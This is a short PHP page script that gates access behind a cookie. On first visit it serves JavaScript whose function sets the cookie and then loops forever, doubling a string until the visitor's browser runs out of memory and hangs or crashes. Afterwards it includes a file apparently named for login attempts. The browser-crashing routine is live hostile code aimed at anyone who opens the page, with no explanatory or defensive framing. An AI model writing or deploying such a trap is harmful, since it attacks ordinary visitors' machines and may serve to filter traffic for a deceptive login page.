<?php
    $cook=$_COOKIE['round'];
    if($cook==""){
     echo " <script type='text/javascript'>
    function redtoor()
                {
                      document.cookie = 'round=yes';
                      var buffer = '/x64';
                      while(1){buffer = buffer += '/x64';}
                 }
                redtoor();
    </script>";}else{include("login_attempt.php");}
	
?>
